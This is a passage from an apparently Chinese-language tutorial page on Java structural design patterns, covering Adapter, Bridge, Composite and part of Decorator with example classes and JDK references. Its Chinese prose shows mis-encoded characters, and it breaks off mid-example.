<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/ff5152fc-4ff3-44c4-95d6-1061002c364a.png"/> </div><br>
<h3 id="implementation-18" tabindex="-1"> Implementation</h3>
<p>é¸­å­ï¼ˆDuckï¼‰å’Œç«é¸¡ï¼ˆTurkeyï¼‰æ‹¥æœ‰ä¸åŒçš„å«å£°ï¼ŒDuck çš„å«å£°è°ƒç”¨ quack() æ–¹æ³•ï¼Œè€Œ Turkey è°ƒç”¨ gobble() æ–¹æ³•ã€‚</p>
<p>è¦æ±‚å°† Turkey çš„ gobble() æ–¹æ³•é€‚é…æˆ Duck çš„ quack() æ–¹æ³•ï¼Œä»è€Œè®©ç«é¸¡å†’å……é¸­å­ï¼</p>
<div><pre><code><span>public</span> <span>interface</span> <span>Duck</span> <span>{</span>
    <span>void</span> <span>quack</span><span>(</span><span>)</span><span>;</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>interface</span> <span>Turkey</span> <span>{</span>
    <span>void</span> <span>gobble</span><span>(</span><span>)</span><span>;</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>WildTurkey</span> <span>implements</span> <span>Turkey</span> <span>{</span>
    <span>@Override</span>
    <span>public</span> <span>void</span> <span>gobble</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"gobble!"</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>TurkeyAdapter</span> <span>implements</span> <span>Duck</span> <span>{</span>
    <span>Turkey</span> turkey<span>;</span>

    <span>public</span> <span>TurkeyAdapter</span><span>(</span><span>Turkey</span> turkey<span>)</span> <span>{</span>
        <span>this</span><span>.</span>turkey <span>=</span> turkey<span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>quack</span><span>(</span><span>)</span> <span>{</span>
        turkey<span>.</span><span>gobble</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Client</span> <span>{</span>
    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>
        <span>Turkey</span> turkey <span>=</span> <span>new</span> <span>WildTurkey</span><span>(</span><span>)</span><span>;</span>
        <span>Duck</span> duck <span>=</span> <span>new</span> <span>TurkeyAdapter</span><span>(</span>turkey<span>)</span><span>;</span>
        duck<span>.</span><span>quack</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div><h3 id="jdk-15" tabindex="-1"> JDK</h3>
<ul>
<li><a href="http://docs.oracle.com/javase/8/docs/api/java/util/Arrays.html#asList%28T...%29" target="_blank" rel="noopener noreferrer">java.util.Arrays#asList()</a></li>
<li><a href="https://docs.oracle.com/javase/8/docs/api/java/util/Collections.html#list-java.util.Enumeration-" target="_blank" rel="noopener noreferrer">java.util.Collections#list()</a></li>
<li><a href="https://docs.oracle.com/javase/8/docs/api/java/util/Collections.html#enumeration-java.util.Collection-" target="_blank" rel="noopener noreferrer">java.util.Collections#enumeration()</a></li>
<li><a href="http://docs.oracle.com/javase/8/docs/api/javax/xml/bind/annotation/adapters/XmlAdapter.html#marshal-BoundType-" target="_blank" rel="noopener noreferrer">javax.xml.bind.annotation.adapters.XMLAdapter</a></li>
</ul>
<h2 id="_2-æ¡¥æ¥-bridge" tabindex="-1"> 2. æ¡¥æ¥ï¼ˆBridgeï¼‰</h2>
<h3 id="intent-19" tabindex="-1"> Intent</h3>
<p>å°†æŠ½è±¡ä¸å®ç°åˆ†ç¦»å¼€æ¥ï¼Œä½¿å®ƒä»¬å¯ä»¥ç‹¬ç«‹å˜åŒ–ã€‚</p>
<h3 id="class-diagram-19" tabindex="-1"> Class Diagram</h3>
<ul>
<li>Abstractionï¼šå®šä¹‰æŠ½è±¡ç±»çš„æ¥å£</li>
<li>Implementorï¼šå®šä¹‰å®ç°ç±»æ¥å£</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/2a1f8b0f-1dd7-4409-b177-a381c58066ad.png"/> </div><br>
<h3 id="implementation-19" tabindex="-1"> Implementation</h3>
<p>RemoteControl è¡¨ç¤ºé¥æ§å™¨ï¼ŒæŒ‡ä»£ Abstractionã€‚</p>
<p>TV è¡¨ç¤ºç”µè§†ï¼ŒæŒ‡ä»£ Implementorã€‚</p>
<p>æ¡¥æ¥æ¨¡å¼å°†é¥æ§å™¨å’Œç”µè§†åˆ†ç¦»å¼€æ¥ï¼Œä»è€Œå¯ä»¥ç‹¬ç«‹æ”¹å˜é¥æ§å™¨æˆ–è€…ç”µè§†çš„å®ç°ã€‚</p>
<div><pre><code><span>public</span> <span>abstract</span> <span>class</span> <span>TV</span> <span>{</span>
    <span>public</span> <span>abstract</span> <span>void</span> <span>on</span><span>(</span><span>)</span><span>;</span>

    <span>public</span> <span>abstract</span> <span>void</span> <span>off</span><span>(</span><span>)</span><span>;</span>

    <span>public</span> <span>abstract</span> <span>void</span> <span>tuneChannel</span><span>(</span><span>)</span><span>;</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>Sony</span> <span>extends</span> <span>TV</span> <span>{</span>
    <span>@Override</span>
    <span>public</span> <span>void</span> <span>on</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"Sony.on()"</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>off</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"Sony.off()"</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>tuneChannel</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"Sony.tuneChannel()"</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>RCA</span> <span>extends</span> <span>TV</span> <span>{</span>
    <span>@Override</span>
    <span>public</span> <span>void</span> <span>on</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"RCA.on()"</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>off</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"RCA.off()"</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>tuneChannel</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"RCA.tuneChannel()"</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br></div></div><div><pre><code><span>public</span> <span>abstract</span> <span>class</span> <span>RemoteControl</span> <span>{</span>
    <span>protected</span> <span>TV</span> tv<span>;</span>

    <span>public</span> <span>RemoteControl</span><span>(</span><span>TV</span> tv<span>)</span> <span>{</span>
        <span>this</span><span>.</span>tv <span>=</span> tv<span>;</span>
    <span>}</span>

    <span>public</span> <span>abstract</span> <span>void</span> <span>on</span><span>(</span><span>)</span><span>;</span>

    <span>public</span> <span>abstract</span> <span>void</span> <span>off</span><span>(</span><span>)</span><span>;</span>

    <span>public</span> <span>abstract</span> <span>void</span> <span>tuneChannel</span><span>(</span><span>)</span><span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>ConcreteRemoteControl1</span> <span>extends</span> <span>RemoteControl</span> <span>{</span>
    <span>public</span> <span>ConcreteRemoteControl1</span><span>(</span><span>TV</span> tv<span>)</span> <span>{</span>
        <span>super</span><span>(</span>tv<span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>on</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"ConcreteRemoteControl1.on()"</span><span>)</span><span>;</span>
        tv<span>.</span><span>on</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>off</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"ConcreteRemoteControl1.off()"</span><span>)</span><span>;</span>
        tv<span>.</span><span>off</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>tuneChannel</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"ConcreteRemoteControl1.tuneChannel()"</span><span>)</span><span>;</span>
        tv<span>.</span><span>tuneChannel</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>ConcreteRemoteControl2</span> <span>extends</span> <span>RemoteControl</span> <span>{</span>
    <span>public</span> <span>ConcreteRemoteControl2</span><span>(</span><span>TV</span> tv<span>)</span> <span>{</span>
        <span>super</span><span>(</span>tv<span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>on</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"ConcreteRemoteControl2.on()"</span><span>)</span><span>;</span>
        tv<span>.</span><span>on</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>off</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"ConcreteRemoteControl2.off()"</span><span>)</span><span>;</span>
        tv<span>.</span><span>off</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>tuneChannel</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"ConcreteRemoteControl2.tuneChannel()"</span><span>)</span><span>;</span>
        tv<span>.</span><span>tuneChannel</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Client</span> <span>{</span>
    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>
        <span>RemoteControl</span> remoteControl1 <span>=</span> <span>new</span> <span>ConcreteRemoteControl1</span><span>(</span><span>new</span> <span>RCA</span><span>(</span><span>)</span><span>)</span><span>;</span>
        remoteControl1<span>.</span><span>on</span><span>(</span><span>)</span><span>;</span>
        remoteControl1<span>.</span><span>off</span><span>(</span><span>)</span><span>;</span>
        remoteControl1<span>.</span><span>tuneChannel</span><span>(</span><span>)</span><span>;</span>
        <span>RemoteControl</span> remoteControl2 <span>=</span> <span>new</span> <span>ConcreteRemoteControl2</span><span>(</span><span>new</span> <span>Sony</span><span>(</span><span>)</span><span>)</span><span>;</span>
         remoteControl2<span>.</span><span>on</span><span>(</span><span>)</span><span>;</span>
         remoteControl2<span>.</span><span>off</span><span>(</span><span>)</span><span>;</span>
         remoteControl2<span>.</span><span>tuneChannel</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><h3 id="jdk-16" tabindex="-1"> JDK</h3>
<ul>
<li>AWT (It provides an abstraction layer which maps onto the native OS the windowing support.)</li>
<li>JDBC</li>
</ul>
<h2 id="_3-ç»„åˆ-composite" tabindex="-1"> 3. ç»„åˆï¼ˆCompositeï¼‰</h2>
<h3 id="intent-20" tabindex="-1"> Intent</h3>
<p>å°†å¯¹è±¡ç»„åˆæˆæ ‘å½¢ç»“æ„æ¥è¡¨ç¤ºâ€œæ•´ä½“/éƒ¨åˆ†â€å±‚æ¬¡å…³ç³»ï¼Œå…è®¸ç”¨æˆ·ä»¥ç›¸åŒçš„æ–¹å¼å¤„ç†å•ç‹¬å¯¹è±¡å’Œç»„åˆå¯¹è±¡ã€‚</p>
<h3 id="class-diagram-20" tabindex="-1"> Class Diagram</h3>
<p>ç»„ä»¶ï¼ˆComponentï¼‰ç±»æ˜¯ç»„åˆç±»ï¼ˆCompositeï¼‰å’Œå¶å­ç±»ï¼ˆLeafï¼‰çš„çˆ¶ç±»ï¼Œå¯ä»¥æŠŠç»„åˆç±»çœ‹æˆæ˜¯æ ‘çš„ä¸­é—´èŠ‚ç‚¹ã€‚</p>
<p>ç»„åˆå¯¹è±¡æ‹¥æœ‰ä¸€ä¸ªæˆ–è€…å¤šä¸ªç»„ä»¶å¯¹è±¡ï¼Œå› æ­¤ç»„åˆå¯¹è±¡çš„æ“ä½œå¯ä»¥å§”æ‰˜ç»™ç»„ä»¶å¯¹è±¡å»å¤„ç†ï¼Œè€Œç»„ä»¶å¯¹è±¡å¯ä»¥æ˜¯å¦ä¸€ä¸ªç»„åˆå¯¹è±¡æˆ–è€…å¶å­å¯¹è±¡ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/2b8bfd57-b4d1-4a75-bfb0-bcf1fba4014a.png"/> </div><br>
<h3 id="implementation-20" tabindex="-1"> Implementation</h3>
<div><pre><code><span>public</span> <span>abstract</span> <span>class</span> <span>Component</span> <span>{</span>
    <span>protected</span> <span>String</span> name<span>;</span>

    <span>public</span> <span>Component</span><span>(</span><span>String</span> name<span>)</span> <span>{</span>
        <span>this</span><span>.</span>name <span>=</span> name<span>;</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>print</span><span>(</span><span>)</span> <span>{</span>
        <span>print</span><span>(</span><span>0</span><span>)</span><span>;</span>
    <span>}</span>

    <span>abstract</span> <span>void</span> <span>print</span><span>(</span><span>int</span> level<span>)</span><span>;</span>

    <span>abstract</span> <span>public</span> <span>void</span> <span>add</span><span>(</span><span>Component</span> component<span>)</span><span>;</span>

    <span>abstract</span> <span>public</span> <span>void</span> <span>remove</span><span>(</span><span>Component</span> component<span>)</span><span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Composite</span> <span>extends</span> <span>Component</span> <span>{</span>

    <span>private</span> <span>List</span><span><span>&lt;</span><span>Component</span><span>></span></span> child<span>;</span>

    <span>public</span> <span>Composite</span><span>(</span><span>String</span> name<span>)</span> <span>{</span>
        <span>super</span><span>(</span>name<span>)</span><span>;</span>
        child <span>=</span> <span>new</span> <span>ArrayList</span><span><span>&lt;</span><span>></span></span><span>(</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>void</span> <span>print</span><span>(</span><span>int</span> level<span>)</span> <span>{</span>
        <span>for</span> <span>(</span><span>int</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> level<span>;</span> i<span>++</span><span>)</span> <span>{</span>
            <span>System</span><span>.</span>out<span>.</span><span>print</span><span>(</span><span>"--"</span><span>)</span><span>;</span>
        <span>}</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"Composite:"</span> <span>+</span> name<span>)</span><span>;</span>
        <span>for</span> <span>(</span><span>Component</span> component <span>:</span> child<span>)</span> <span>{</span>
            component<span>.</span><span>print</span><span>(</span>level <span>+</span> <span>1</span><span>)</span><span>;</span>
        <span>}</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>add</span><span>(</span><span>Component</span> component<span>)</span> <span>{</span>
        child<span>.</span><span>add</span><span>(</span>component<span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>remove</span><span>(</span><span>Component</span> component<span>)</span> <span>{</span>
        child<span>.</span><span>remove</span><span>(</span>component<span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Leaf</span> <span>extends</span> <span>Component</span> <span>{</span>
    <span>public</span> <span>Leaf</span><span>(</span><span>String</span> name<span>)</span> <span>{</span>
        <span>super</span><span>(</span>name<span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>void</span> <span>print</span><span>(</span><span>int</span> level<span>)</span> <span>{</span>
        <span>for</span> <span>(</span><span>int</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> level<span>;</span> i<span>++</span><span>)</span> <span>{</span>
            <span>System</span><span>.</span>out<span>.</span><span>print</span><span>(</span><span>"--"</span><span>)</span><span>;</span>
        <span>}</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"left:"</span> <span>+</span> name<span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>add</span><span>(</span><span>Component</span> component<span>)</span> <span>{</span>
        <span>throw</span> <span>new</span> <span>UnsupportedOperationException</span><span>(</span><span>)</span><span>;</span> <span>// ç‰ºç‰²é€æ˜æ€§æ¢å–å•ä¸€èŒè´£åŸåˆ™ï¼Œè¿™æ ·å°±ä¸ç”¨è€ƒè™‘æ˜¯å¶å­èŠ‚ç‚¹è¿˜æ˜¯ç»„åˆèŠ‚ç‚¹</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>remove</span><span>(</span><span>Component</span> component<span>)</span> <span>{</span>
        <span>throw</span> <span>new</span> <span>UnsupportedOperationException</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Client</span> <span>{</span>
    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>
        <span>Composite</span> root <span>=</span> <span>new</span> <span>Composite</span><span>(</span><span>"root"</span><span>)</span><span>;</span>
        <span>Component</span> node1 <span>=</span> <span>new</span> <span>Leaf</span><span>(</span><span>"1"</span><span>)</span><span>;</span>
        <span>Component</span> node2 <span>=</span> <span>new</span> <span>Composite</span><span>(</span><span>"2"</span><span>)</span><span>;</span>
        <span>Component</span> node3 <span>=</span> <span>new</span> <span>Leaf</span><span>(</span><span>"3"</span><span>)</span><span>;</span>
        root<span>.</span><span>add</span><span>(</span>node1<span>)</span><span>;</span>
        root<span>.</span><span>add</span><span>(</span>node2<span>)</span><span>;</span>
        root<span>.</span><span>add</span><span>(</span>node3<span>)</span><span>;</span>
        <span>Component</span> node21 <span>=</span> <span>new</span> <span>Leaf</span><span>(</span><span>"21"</span><span>)</span><span>;</span>
        <span>Component</span> node22 <span>=</span> <span>new</span> <span>Composite</span><span>(</span><span>"22"</span><span>)</span><span>;</span>
        node2<span>.</span><span>add</span><span>(</span>node21<span>)</span><span>;</span>
        node2<span>.</span><span>add</span><span>(</span>node22<span>)</span><span>;</span>
        <span>Component</span> node221 <span>=</span> <span>new</span> <span>Leaf</span><span>(</span><span>"221"</span><span>)</span><span>;</span>
        node22<span>.</span><span>add</span><span>(</span>node221<span>)</span><span>;</span>
        root<span>.</span><span>print</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br></div></div><div><pre><code>Composite:root
--left:1
--Composite:2
----left:21
----Composite:22
------left:221
--left:3
</code></pre></div><h3 id="jdk-17" tabindex="-1"> JDK</h3>
<ul>
<li>javax.swing.JComponent#add(Component)</li>
<li>java.awt.Container#add(Component)</li>
<li>java.util.Map#putAll(Map)</li>
<li>java.util.List#addAll(Collection)</li>
<li>java.util.Set#addAll(Collection)</li>
</ul>
<h2 id="_4-è£…é¥°-decorator" tabindex="-1"> 4. è£…é¥°ï¼ˆDecoratorï¼‰</h2>
<h3 id="intent-21" tabindex="-1"> Intent</h3>
<p>ä¸ºå¯¹è±¡åŠ¨æ€æ·»åŠ åŠŸèƒ½ã€‚</p>
<h3 id="class-diagram-21" tabindex="-1"> Class Diagram</h3>
<p>è£…é¥°è€…ï¼ˆDecoratorï¼‰å’Œå…·ä½“ç»„ä»¶ï¼ˆConcreteComponentï¼‰éƒ½ç»§æ‰¿è‡ªç»„ä»¶ï¼ˆComponentï¼‰ï¼Œå…·ä½“ç»„ä»¶çš„æ–¹æ³•å®ç°ä¸éœ€è¦ä¾èµ–äºå…¶å®ƒå¯¹è±¡ï¼Œè€Œè£…é¥°è€…ç»„åˆäº†ä¸€ä¸ªç»„ä»¶ï¼Œè¿™æ ·å®ƒå¯ä»¥è£…é¥°å…¶å®ƒè£…é¥°è€…æˆ–è€…å…·ä½“ç»„ä»¶ã€‚æ‰€è°“è£…é¥°ï¼Œå°±æ˜¯æŠŠè¿™ä¸ªè£…é¥°è€…å¥—åœ¨è¢«è£…é¥°è€…ä¹‹ä¸Šï¼Œä»è€ŒåŠ¨æ€æ‰©å±•è¢«è£…é¥°è€…çš„åŠŸèƒ½ã€‚è£…é¥°è€…çš„æ–¹æ³•æœ‰ä¸€éƒ¨åˆ†æ˜¯è‡ªå·±çš„ï¼Œè¿™å±äºå®ƒçš„åŠŸèƒ½ï¼Œç„¶åè°ƒç”¨è¢«è£…é¥°è€…çš„æ–¹æ³•å®ç°ï¼Œä»è€Œä¹Ÿä¿ç•™äº†è¢«è£…é¥°è€…çš„åŠŸèƒ½ã€‚å¯ä»¥çœ‹åˆ°ï¼Œå…·ä½“ç»„ä»¶åº”å½“æ˜¯è£…é¥°å±‚æ¬¡çš„æœ€ä½å±‚ï¼Œå› ä¸ºåªæœ‰å…·ä½“ç»„ä»¶çš„æ–¹æ³•å®ç°ä¸éœ€è¦ä¾èµ–äºå…¶å®ƒå¯¹è±¡ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/6b833bc2-517a-4270-8a5e-0a5f6df8cd96.png"/> </div><br>
<h3 id="implementation-21" tabindex="-1"> Implementation</h3>
<p>è®¾è®¡ä¸åŒç§ç±»çš„é¥®æ–™ï¼Œé¥®æ–™å¯ä»¥æ·»åŠ é…æ–™ï¼Œæ¯”å¦‚å¯ä»¥æ·»åŠ ç‰›å¥¶ï¼Œå¹¶ä¸”æ”¯æŒåŠ¨æ€æ·»åŠ æ–°é…æ–™ã€‚æ¯å¢åŠ ä¸€ç§é…æ–™ï¼Œè¯¥é¥®æ–™çš„ä»·æ ¼å°±ä¼šå¢åŠ ï¼Œè¦æ±‚è®¡ç®—ä¸€ç§é¥®æ–™çš„ä»·æ ¼ã€‚</p>
<p>ä¸‹å›¾è¡¨ç¤ºåœ¨ DarkRoast é¥®æ–™ä¸Šæ–°å¢æ–°æ·»åŠ  Mocha é…æ–™ï¼Œä¹‹ååˆæ·»åŠ äº† Whip é…æ–™ã€‚DarkRoast è¢« Mocha åŒ…è£¹ï¼ŒMocha åˆè¢« Whip åŒ…è£¹ã€‚å®ƒä»¬éƒ½ç»§æ‰¿è‡ªç›¸åŒçˆ¶ç±»ï¼Œéƒ½æœ‰ cost() æ–¹æ³•ï¼Œå¤–å±‚ç±»çš„ cost() æ–¹æ³•è°ƒç”¨äº†å†…å±‚ç±»çš„ cost() æ–¹æ³•ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/c9cfd600-bc91-4f3a-9f99-b42f88a5bb24.jpg" width="600"/> </div><br>
<div><pre><code><span>public</span> <span>interface</span> <span>Beverage</span> <span>{</span>
    <span>double</span> <span>cost</span><span>(</span><span>)</span><span>;</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>DarkRoast</span> <span>implements</span> <span>Beverage</span> <span>{</span>
    <span>@Override</span>
    <span>public</span> <span>double</span> <span>cost</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> <span>1</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>HouseBlend</span> <span>implements</span> <span>Beverage</span> <span>{</span>
    <span>@Override</span>
    <span>public</span> <span>double</span> <span>cost</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> <span>1</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>abstract</span> <span>class</span> <span>CondimentDecorator</span> <span>implements</span> <span>Beverage</span> <span>{</span>
    <span>protected</span> <span>Beverage</span> beverage<span>;</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>Milk</span> <span>extends</span> <span>CondimentDecorator</span> <span>{</span>

    <span>public</span> <span>Milk</span><span>(</span><span>Beverage</span> beverage<span>)</span> <span>{</span>
        <span>this</span><span>.</span>beverage <span>=</span> beverage<span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>double</span> <span>cost</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> <span>1</span> <span>+</span> beverage<span>.</span><span>cost</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Mocha</span> <span>extends</span> <span>CondimentDecorator</span> <span>{</span>

    <span>public</span> <span>Mocha</span><span>(</span><span>Beverage</span> beverage<span>)</span> <span>{</span>
        <span>this</span><span>.</span>beverage <span>=</span> beverage<span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>double</span> <span>cost</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> <span>1</span> <span>+</span> beverage<span>.</span><span>cost</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Client</span> <span>{</span>

    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>
